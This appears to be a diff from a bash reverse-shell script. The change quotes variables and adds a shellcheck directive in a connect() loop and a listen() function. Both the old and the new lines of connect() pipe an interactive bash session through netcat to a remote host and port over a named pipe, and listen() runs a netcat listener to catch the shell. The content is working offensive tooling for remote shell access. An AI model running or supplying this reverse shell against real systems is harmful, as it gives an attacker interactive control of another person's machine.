@@ -33,16 +33,17 @@ warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
 
 connect() {
     while :; do
-        rm -f $fifo
-        mkfifo $fifo
-        cat $fifo | bash -i 2>&1 | $nc $host $port >$fifo
+        rm -f "$fifo"
+        mkfifo "$fifo"
+        # shellcheck disable=SC2094
+        bash -i 2>&1 <"$fifo" | "$nc" "$host" "$port" >"$fifo"
         sleep 1
     done
-    rm -f $fifo
+    rm -f "$fifo"
 }
 
 listen() {
-    $nc -lvp $port
+    "$nc" -lvp "$port"
 }
 
 usage() {
